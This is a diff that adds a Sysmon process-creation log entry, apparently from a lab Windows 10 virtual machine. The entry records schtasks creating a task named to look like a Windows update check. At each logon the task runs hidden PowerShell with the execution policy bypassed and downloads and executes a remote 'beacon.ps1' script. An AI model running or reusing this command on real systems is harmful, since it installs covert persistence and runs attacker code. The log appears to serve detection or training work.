@@ -1,0 +1,38 @@
+07/29/2026 06:04:47.321 PM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=1
+EventType=4
+ComputerName=Windows10
+User=NOT_TRANSLATED
+Sid=S-1-5-18
+SidType=0
+SourceName=Microsoft-Windows-Sysmon
+Type=Information
+RecordNumber=13201
+Keywords=None
+TaskCategory=Process Create (rule: ProcessCreate)
+OpCode=Info
+Message=Process Create:
+RuleName: -
+UtcTime: 2026-07-29 12:34:46.921
+ProcessGuid: {a802fc0f-f366-6a69-8c07-000000000d00}
+ProcessId: 12168
+Image: C:\Windows\System32\schtasks.exe
+FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
+Description: Task Scheduler Configuration Tool
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: schtasks.exe
+CommandLine: "C:\Windows\system32\schtasks.exe" /create /tn WindowsUpdateHealthCheck /tr "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.101/beacon.ps1')"" /sc onlogon /ru vboxuser /f
+CurrentDirectory: C:\Users\vboxuser\Desktop\
+User: WINDOWS10\vboxuser
+LogonGuid: {a802fc0f-d04b-6a69-9c22-050000000000}
+LogonId: 0x5229C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=D4DA03B7BB20B7E4F1B762A365D4DD4F,SHA256=9A80453518078BADF0679B0CF30F50A83163E5264A2665C6052CC27F168C50F2,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05
+ParentProcessGuid: {a802fc0f-d16b-6a69-4301-000000000d00}
+ParentProcessId: 5920
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+ParentUser: WINDOWS10\vboxuser
